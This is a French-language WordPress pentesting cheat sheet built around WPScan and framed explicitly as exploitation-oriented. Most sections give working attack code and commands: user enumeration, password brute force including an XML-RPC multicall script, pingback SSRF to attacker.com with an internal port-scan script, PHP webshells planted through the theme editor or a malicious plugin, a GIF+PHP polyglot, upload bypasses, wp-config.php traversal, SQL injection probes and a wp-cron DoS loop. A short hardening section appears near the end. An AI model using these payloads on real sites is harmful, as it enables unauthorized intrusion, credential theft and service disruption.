# 🔍 WPScan - Cheatsheet Cyber Sécurité

Guide orienté **exploitation** et **pentesting WordPress** avec WPScan. Focus sur l'énumération, la détection de vulnérabilités et l'exploitation.

---

## 📖 Qu'est-ce que WPScan ?

**WPScan** est un scanner de sécurité WordPress open-source qui permet de :
- Énumérer les plugins/thèmes vulnérables
- Détecter les versions WordPress
- Brute-force de credentials
- Identifier les utilisateurs
- Trouver des fichiers sensibles
- Exploiter des vulnérabilités connues

**Base de données de vulnérabilités** : 30,000+ vulnérabilités WordPress/Plugins/Thèmes

---

## 1️⃣ Scan Basique et Énumération

### Scan simple

```bash
wpscan --url http://target.com

# Avec API token (recommandé)
wpscan --url http://target.com --api-token YOUR_TOKEN

# Verbose mode
wpscan --url http://target.com -v

# Ignorer les erreurs SSL
wpscan --url https://target.com --disable-tls-checks
```

### Énumération complète

```bash
# Énumérer TOUT
wpscan --url http://target.com --enumerate ap,at,cb,dbe,u

# Options d'énumération :
# ap  = All Plugins
# at  = All Themes
# tt  = Timthumbs
# cb  = Config Backups
# dbe = Db Exports
# u   = Users (par défaut u1-10)
# m   = Media IDs
# vp  = Vulnerable Plugins
# vt  = Vulnerable Themes
```

**Énumération ciblée**
```bash
# Plugins uniquement
wpscan --url http://target.com --enumerate p

# Plugins vulnérables uniquement
wpscan --url http://target.com --enumerate vp

# Tous les plugins (détection agressive)
wpscan --url http://target.com --enumerate ap --plugins-detection aggressive

# Thèmes
wpscan --url http://target.com --enumerate t

# Utilisateurs (1-100)
wpscan --url http://target.com --enumerate u1-100

# Config backups
wpscan --url http://target.com --enumerate cb
```

---

## 2️⃣ Détection de Version WordPress

### Version WordPress

```bash
wpscan --url http://target.com

# Recherche dans :
- Meta generator tag
- RSS feed
- Atom feed
- RDF feed
- Style.css
- Readme.html
- Links opml
```

**Fichiers révélant la version**
```
/readme.html
/license.txt
/wp-includes/css/dashicons.min.css
/wp-includes/js/jquery/jquery.js
/wp-admin/css/install.css
```

**URLs à tester manuellement**
```
http://target.com/readme.html
http://target.com/license.txt
http://target.com/wp-links-opml.php
http://target.com/?feed=rss2
http://target.com/?feed=atom
```

---

## 3️⃣ Énumération de Plugins

### Détection de plugins

```bash
# Plugins populaires (passive)
wpscan --url http://target.com --enumerate p --plugins-detection passive

# Tous les plugins (mixed = passive + active)
wpscan --url http://target.com --enumerate ap --plugins-detection mixed

# Aggressive (force tous les plugins de la DB)
wpscan --url http://target.com --enumerate ap --plugins-detection aggressive
```

**Méthodes de détection**
```
1. Passive : 
   - Liens dans le HTML
   - Scripts/CSS chargés
   - Aucune requête supplémentaire

2. Mixed :
   - Passive + vérification d'existence
   - Requêtes ciblées

3. Aggressive :
   - Teste TOUS les plugins de la DB
   - Beaucoup de requêtes (détectable)
```

### Plugins vulnérables

```bash
# Uniquement les vulnérables (nécessite API token)
wpscan --url http://target.com --enumerate vp --api-token TOKEN

# Output JSON pour parsing
wpscan --url http://target.com --enumerate vp -f json -o results.json
```

**Exploitation manuelle**
```
1. Identifier le plugin vulnérable
2. Chercher l'exploit : searchsploit nom_plugin
3. Vérifier sur exploit-db.com
4. Tester la vulnérabilité
```

---

## 4️⃣ Énumération de Thèmes

### Détection de thèmes

```bash
# Thèmes détectés
wpscan --url http://target.com --enumerate t

# Tous les thèmes
wpscan --url http://target.com --enumerate at --plugins-detection aggressive

# Thèmes vulnérables uniquement
wpscan --url http://target.com --enumerate vt --api-token TOKEN
```

**Fichiers de thèmes**
```
/wp-content/themes/[theme-name]/style.css
/wp-content/themes/[theme-name]/screenshot.png
/wp-content/themes/[theme-name]/readme.txt
```

**Exploitation de thèmes**
```
# LFI via theme editor
/wp-admin/theme-editor.php?file=404.php&theme=vulnerable-theme

# Upload de shell via customizer
/wp-admin/customize.php
```

---

## 5️⃣ Énumération d'Utilisateurs

### Méthodes d'énumération

```bash
# Par défaut (u1-10)
wpscan --url http://target.com --enumerate u

# Range spécifique (u1-100)
wpscan --url http://target.com --enumerate u1-100

# Tous les utilisateurs détectables
wpscan --url http://target.com --enumerate u1-10000
```

**Techniques d'énumération**

**1. Author Archives**
```
http://target.com/?author=1
http://target.com/?author=2
→ Redirige vers /author/username/
```

**2. JSON REST API**
```bash
curl http://target.com/wp-json/wp/v2/users

# Avec jq pour parser
curl http://target.com/wp-json/wp/v2/users | jq '.[].slug'
```

**3. XML-RPC**
```bash
curl -X POST http://target.com/xmlrpc.php -d '
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value>admin</value></param>
    <param><value>password</value></param>
  </params>
</methodCall>'
```

**4. Login Error Messages**
```
# Username existe : "ERROR: The password you entered for the username admin is incorrect"
# Username n'existe pas : "ERROR: Invalid username"
```

---

## 6️⃣ Brute Force

### Brute force de passwords

```bash
# Avec wordlist
wpscan --url http://target.com --passwords /usr/share/wordlists/rockyou.txt

# Cibler un user spécifique
wpscan --url http://target.com -U admin -P /path/to/wordlist.txt

# Cibler plusieurs users
wpscan --url http://target.com -U users.txt -P passwords.txt

# Avec threads (défaut: 5)
wpscan --url http://target.com -U admin -P wordlist.txt -t 50
```

**Créer liste d'users**
```bash
# Extraire depuis WPScan
wpscan --url http://target.com --enumerate u | grep "Username:" | cut -d ":" -f 2 > users.txt

# Ou depuis REST API
curl http://target.com/wp-json/wp/v2/users | jq -r '.[].slug' > users.txt
```

### XML-RPC Brute Force (Amplification)

**Avantage** : 1 requête = tester plusieurs passwords
```bash
# Script Python pour XML-RPC multicall
import requests

url = "http://target.com/xmlrpc.php"
username = "admin"
passwords = ["pass1", "pass2", "pass3"]

# Créer le XML avec plusieurs tentatives
xml = '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>'

for password in passwords:
    xml += f'''
    <value><struct>
      <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
      <member><name>params</name><value><array><data>
        <value><array><data>
          <value><string>{username}</string></value>
          <value><string>{password}</string></value>
        </data></array></value>
      </data></array></value></member>
    </struct></value>
    '''

xml += '</data></array></value></param></params></methodCall>'

response = requests.post(url, data=xml)
print(response.text)
```

---

## 7️⃣ Vulnérabilités Communes WordPress

### Fichiers sensibles exposés

```bash
# Config backups
wpscan --url http://target.com --enumerate cb

# Fichiers courants :
/wp-config.php.bak
/wp-config.php.old
/wp-config.php.save
/wp-config.php~
/wp-config.php.swp
/.wp-config.php.swp
/wp-config.php.txt
/backup/wp-config.php
```

**Test manuel**
```bash
# Wordlist de backups
for ext in bak old save txt swp ~ .save .bak; do
  curl -I http://target.com/wp-config.php$ext
done

# Database exports
curl -I http://target.com/wp-content/backup.sql
curl -I http://target.com/wp-content/dump.sql
curl -I http://target.com/database.sql
```

### XML-RPC Enabled

```bash
# Vérifier si XML-RPC est actif
curl -X POST http://target.com/xmlrpc.php -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'

# Exploitation :
# 1. Brute force (multicall)
# 2. DDoS/DoS (pingback)
# 3. Port scanning (pingback SSRF)
```

**Pingback SSRF**
```xml
POST /xmlrpc.php HTTP/1.1

<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>http://attacker.com/</string></value></param>
    <param><value><string>http://target.com/existing-post</string></value></param>
  </params>
</methodCall>
```

**Port scanning via Pingback**
```python
import requests

target = "http://target.com/xmlrpc.php"
internal_ip = "192.168.1.100"

for port in [21, 22, 80, 443, 3306, 8080]:
    xml = f'''
    <methodCall>
      <methodName>pingback.ping</methodName>
      <params>
        <param><value><string>http://{internal_ip}:{port}/</string></value></param>
        <param><value><string>http://target.com/</string></value></param>
      </params>
    </methodCall>'''
    
    response = requests.post(target, data=xml)
    if "error" not in response.text.lower():
        print(f"Port {port} might be open!")
```

### Directory Listing

```bash
# Vérifier directory listing
curl -I http://target.com/wp-content/uploads/
curl -I http://target.com/wp-includes/
curl -I http://target.com/wp-content/plugins/

# Si activé → Information disclosure
```

### User Enumeration

**Via REST API (WordPress >= 4.7)**
```bash
# Lister tous les users
curl http://target.com/wp-json/wp/v2/users

# User spécifique
curl http://target.com/wp-json/wp/v2/users/1

# Désactiver : ajouter dans functions.php
add_filter('rest_endpoints', function($endpoints) {
    if (isset($endpoints['/wp/v2/users'])) {
        unset($endpoints['/wp/v2/users']);
    }
    return $endpoints;
});
```

---

## 8️⃣ Exploitation Post-Auth

### Shell Upload via Theme/Plugin Editor

**Méthode 1 : Theme Editor**
```
1. Se connecter en admin
2. Appearance > Theme Editor
3. Éditer 404.php ou functions.php
4. Injecter un webshell :

<?php system($_GET['cmd']); ?>

5. Accéder : http://target.com/wp-content/themes/theme-name/404.php?cmd=whoami
```

**Méthode 2 : Plugin Editor**
```
1. Plugins > Plugin Editor
2. Éditer un plugin inactif
3. Injecter webshell
4. Activer le plugin si nécessaire
```

**Méthode 3 : Upload de Plugin malveillant**
```php
// Create malicious plugin : shell.php
<?php
/*
Plugin Name: Shell
*/
system($_GET['cmd']);
?>

// Zipper
zip shell.zip shell.php

// Upload
Plugins > Add New > Upload Plugin
```

### Privilege Escalation

**Exploitation d'un Contributor**
```
Contributors peuvent :
- Créer des posts (non publiés)
- Uploader des médias

Exploitation :
1. Upload d'un fichier PHP déguisé en image
2. Accès direct au fichier uploadé
```

**Exploitation d'un Editor**
```
Editors peuvent :
- Éditer les posts/pages
- Gérer les médias

Exploitation :
1. Injection de JavaScript dans posts
2. Stored XSS → vol de cookies admin
```

---

## 9️⃣ Plugins Vulnérables Fréquents

### Contact Form 7

**Vulnérabilités communes** :
- File Upload Unrestricted (< 5.3.2)
- Stored XSS
- CSRF

**Exploitation**
```bash
# Vérifier version
curl http://target.com/wp-content/plugins/contact-form-7/readme.txt

# Upload de shell si vulnérable
POST /wp-admin/admin-ajax.php
Content-Type: multipart/form-data

action=wpcf7_submit&_wpcf7_unit_tag=...&file=shell.php
```

### Elementor

**Vulnérabilités** :
- Arbitrary File Upload
- Local File Inclusion
- CSRF to RCE

**Exploitation LFI**
```
http://target.com/wp-content/plugins/elementor/modules/ajax/module.php?file=../../../../wp-config.php
```

### WooCommerce

**Vulnérabilités** :
- SQL Injection
- Authentication Bypass
- Privilege Escalation

**SQL Injection (CVE-2021-34646)**
```bash
# Vulnerable parameter
http://target.com/?order=1' UNION SELECT...
```

### Yoast SEO

**Vulnérabilités** :
- Blind SQL Injection
- Stored XSS

### Slider Revolution

**Arbitrary File Download (Classique)**
```
http://target.com/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
```

---

## 🔟 Techniques Avancées

### Timing-based User Enumeration

```python
import requests
import time

url = "http://target.com/wp-login.php"

for user in ["admin", "administrator", "root", "user"]:
    start = time.time()
    
    data = {
        "log": user,
        "pwd": "wrongpassword123456789",
        "wp-submit": "Log In"
    }
    
    requests.post(url, data=data)
    duration = time.time() - start
    
    # Si l'utilisateur existe, le temps de réponse peut différer
    print(f"{user}: {duration:.2f}s")
```

### SQL Injection via Vulnerable Plugin

**Recherche de paramètres injectables**
```bash
# Test basique
http://target.com/?id=1'
http://target.com/?id=1 AND 1=1--
http://target.com/?id=1 UNION SELECT NULL--

# Time-based blind
http://target.com/?id=1 AND SLEEP(5)--

# Boolean-based
http://target.com/?id=1 AND 1=1--  # True
http://target.com/?id=1 AND 1=2--  # False
```

### Exploitation de wp-cron.php

**DoS via wp-cron**
```bash
# wp-cron.php peut être déclenché sans auth
# Spam pour surcharger le serveur
for i in {1..1000}; do
  curl http://target.com/wp-cron.php &
done
```

### Exploitation Media Upload

**Bypass d'extension**
```
# Méthodes de bypass :
1. Double extension : shell.php.jpg
2. Null byte : shell.php%00.jpg
3. Case manipulation : shell.phP
4. Alternative extensions : .php5, .phtml, .phar
5. MIME type spoofing : GIF89a + PHP code
```

**Payload GIF + PHP**
```php
GIF89a;
<?php system($_GET['cmd']); ?>
```

---

## 1️⃣1️⃣ Automatisation et Scripts

### Script d'énumération complète

```bash
#!/bin/bash
# wp-full-scan.sh

TARGET=$1
API_TOKEN="YOUR_API_TOKEN"

echo "[+] Scanning $TARGET"

# 1. Scan basique
echo "[*] Basic scan..."
wpscan --url $TARGET --api-token $API_TOKEN -o scan_basic.txt

# 2. Énumération plugins vulnérables
echo "[*] Vulnerable plugins..."
wpscan --url $TARGET --enumerate vp --api-token $API_TOKEN -o scan_vp.txt

# 3. Énumération thèmes vulnérables
echo "[*] Vulnerable themes..."
wpscan --url $TARGET --enumerate vt --api-token $API_TOKEN -o scan_vt.txt

# 4. Énumération users
echo "[*] Users enumeration..."
wpscan --url $TARGET --enumerate u1-100 -o scan_users.txt

# 5. Config backups
echo "[*] Config backups..."
wpscan --url $TARGET --enumerate cb -o scan_backups.txt

# 6. Timthumbs
echo "[*] Timthumbs..."
wpscan --url $TARGET --enumerate tt -o scan_timthumbs.txt

echo "[+] Scan complete! Check output files."
```

### Script de brute force intelligent

```bash
#!/bin/bash
# wp-smart-bruteforce.sh

TARGET=$1
WORDLIST=$2

# 1. Énumérer les users
echo "[*] Enumerating users..."
wpscan --url $TARGET --enumerate u1-50 | grep "Username:" | cut -d ":" -f 2 | tr -d ' ' > users.txt

# 2. Brute force avec rate limiting
echo "[*] Starting brute force..."
while IFS= read -r user; do
    echo "[*] Testing user: $user"
    wpscan --url $TARGET -U "$user" -P $WORDLIST -t 5 --max-threads 1
    sleep 5  # Pause entre users
done < users.txt

echo "[+] Brute force complete!"
```

---

## 1️⃣2️⃣ WPScan avec Burp Suite

### Proxyfier WPScan

```bash
# Via Burp Proxy
wpscan --url http://target.com --proxy http://127.0.0.1:8080

# Avec auth proxy
wpscan --url http://target.com --proxy http://user:pass@127.0.0.1:8080

# Ignorer SSL errors
wpscan --url https://target.com --proxy http://127.0.0.1:8080 --disable-tls-checks
```

**Avantages** :
- Voir toutes les requêtes
- Modifier les requêtes à la volée
- Fuzzer manuellement
- Exploiter avec Repeater/Intruder

---

## 1️⃣3️⃣ Défense et Hardening

### Sécurisation WordPress

**Désactiver XML-RPC**
```php
// Dans wp-config.php
add_filter('xmlrpc_enabled', '__return_false');

// Ou dans .htaccess
<Files xmlrpc.php>
  Order Deny,Allow
  Deny from all
</Files>
```

**Désactiver REST API Users**
```php
// functions.php
add_filter('rest_endpoints', function($endpoints) {
    if (isset($endpoints['/wp/v2/users'])) {
        unset($endpoints['/wp/v2/users']);
        unset($endpoints['/wp/v2/users/(?P<id>[\d]+)']);
    }
    return $endpoints;
});
```

**Cacher version WordPress**
```php
// functions.php
remove_action('wp_head', 'wp_generator');

// Supprimer readme.html et license.txt
rm wp-admin/readme.html
rm license.txt
```

**Limiter tentatives de login**
```php
// Utiliser plugin : Limit Login Attempts Reloaded
// Ou via .htaccess rate limiting
```

**File Permissions**
```bash
# Permissions recommandées
find /var/www/html -type d -exec chmod 755 {} \;
find /var/www/html -type f -exec chmod 644 {} \;
chmod 600 wp-config.php
```

---

## 1️⃣4️⃣ Outils Complémentaires

### WPSeku
```bash
git clone https://github.com/m4ll0k/WPSeku
cd WPSeku
pip3 install -r requirements.txt

python3 wpseku.py -t http://target.com
```

### CMSmap
```bash
cmsmap -t http://target.com -a "Mozilla/5.0"
```

### Nuclei (WordPress Templates)
```bash
nuclei -u http://target.com -t /path/to/nuclei-templates/vulnerabilities/wordpress/
```

### Nikto
```bash
nikto -h http://target.com -Plugins wordpress
```

---

## 1️⃣5️⃣ Checklist Pentest WordPress

```
☑ Énumération
  □ Version WordPress
  □ Plugins installés
  □ Thèmes installés
  □ Utilisateurs (u1-100)
  □ Fichiers exposés

☑ Vulnérabilités
  □ Plugins vulnérables (avec API token)
  □ Thèmes vulnérables
  □ Version WordPress obsolète
  □ XML-RPC activé
  □ REST API users exposée

☑ Configuration
  □ Config backups (wp-config.php.bak)
  □ Database exports
  □ Directory listing
  □ Debug mode activé
  □ Timthumbs

☑ Authentication
  □ Brute force (users identifiés)
  □ Weak passwords
  □ Default credentials
  □ XML-RPC multicall

☑ Post-Exploitation
  □ Theme/Plugin editor accessible
  □ File upload vulnérabilités
  □ Privilege escalation possible
  □ Shell upload paths
```

---

## 1️⃣6️⃣ Commandes Rapides

### Scan express
```bash
wpscan --url http://target.com --enumerate vp,vt,u --api-token TOKEN
```

### Énumération agressive
```bash
wpscan --url http://target.com --enumerate ap,at,u1-100 --plugins-detection aggressive
```

### Brute force rapide
```bash
wpscan --url http://target.com -U admin -P /usr/share/wordlists/rockyou.txt -t 50
```

### Output en JSON
```bash
wpscan --url http://target.com -f json -o results.json
```

### Scan via proxy
```bash
wpscan --url http://target.com --proxy http://127.0.0.1:8080
```

---

## 1️⃣7️⃣ Ressources

### Documentation
- WPScan Official : https://github.com/wpscanteam/wpscan
- WordPress Security : https://wordpress.org/support/article/hardening-wordpress/
- OWASP WordPress Security : https://owasp.org/www-project-wordpress-security/

### Bases de vulnérabilités
- WPVulnDB : https://wpscan.com/
- Exploit-DB WordPress : https://www.exploit-db.com/search?q=wordpress
- CVE Details : https://www.cvedetails.com/product/4096/Wordpress-Wordpress.html

### Labs
- HackTheBox - WordPress machines
- TryHackMe - WordPress rooms
- VulnHub - WordPress VMs

---

## 💡 Tips Pro

1. **Toujours utiliser un API token** pour détecter les vulnérabilités
2. **Énumérer en mode passive** d'abord pour rester discret
3. **Proxyfier via Burp** pour analyse manuelle détaillée
4. **Combiner avec nuclei** pour templates additionnels
5. **Chercher exploits** : `searchsploit wordpress plugin_name`
6. **XML-RPC = goldmine** : brute force + SSRF + DoS
7. **REST API users** : énumération facile si non protégée
8. **Config backups** : toujours vérifier wp-config.php.*
9. **Theme/Plugin editor** : RCE direct si admin compromis
10. **Timing attacks** : différencier users existants/non-existants

---

**🔍 WordPress représente 43% des sites web. Maîtriser WPScan = énorme surface d'attaque !**
